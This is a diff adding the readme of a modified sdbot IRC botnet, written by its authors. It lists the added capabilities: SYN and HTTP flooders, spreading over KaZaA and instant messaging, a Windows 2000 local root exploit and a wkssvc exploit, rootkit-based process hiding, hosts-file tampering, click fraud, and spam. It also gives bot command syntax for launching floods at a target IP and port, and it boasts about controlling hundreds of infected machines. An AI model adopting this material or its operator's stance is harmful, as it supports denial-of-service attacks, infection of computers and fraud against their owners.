@@ -1,0 +1,48 @@
+sdbot v0.5b by [sd]
+credits for the main sdbot0.5b.cpp gose to stoney
+
+//[voodo0]//
+-removed/undefined sirh0ts backdoors :P
+	-LocalRoot (local exploit for win2K <SP3)
+	-kelvir
+	-half of taskhider
+-added ASN and PNP scanner
+
+
+//[sirh0t]//
+
+-future remove all exploits + FTP
+
+-added tcpip.sys fix ... sp2 fix ..working one 
+-added KaZaA Share (p2p)
+-added SpyBOT SYN Flooder
+-added HTTP Flooder
+-added some changes in ChgHosts (undetected)
+-added ClickThru function
+-added LocalRoot (local exploit for win2K <SP3)
+-added IMSpread (NEW full working never used before)
+-added IELower
+-added wkssvc + added shitty offset bruteforcer
+
+-removed all shit exploiters
+-replaced taskhider with GencTurk's hxdef mod
+-fixed little things
+
+Some command syntaxis
+
+.cashout <URL1> [URL2] [URL3]
+.syn2 <IP> <Port> <delay> <attack time in seconds>
+.httpflood <IP> <Port> <delay> <attack time in seconds>
+.http.post <host> <port> <file> <data> [referer]
+.http.open <URL>
+.kelvir <Spam message>
+
+This is just a fast mod I know its 100% workin :P
+Its more like an old GT bot that use extern files LoL! packed size is 110 kB but it spreads ;\
+Comment : bitchez start with 200 bots then see what happens not with crapy 10 bots >.<
+
+Credits goes out to
+-[SD] for making the bot
+-bcuzZ for addin some shit (I take his work cuz I dont have time to add (T)FTPd)
+-GencTurk for making a stable undetected hxdef
+-Mich for making powerfull unspoofed SYN Flooder
